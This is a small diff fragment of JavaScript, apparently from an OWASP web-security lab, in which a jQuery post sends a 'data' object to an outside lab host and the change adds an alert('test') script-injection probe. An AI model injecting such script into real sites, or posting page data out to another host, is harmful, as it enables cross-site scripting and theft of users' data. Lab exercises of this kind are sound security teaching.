@@ -15,3 +15,5 @@ data = {
 }
 $.post("http://owasp01.tic.heia-fr.ch/", data)
 .done(function(){})
+
+alert("test")
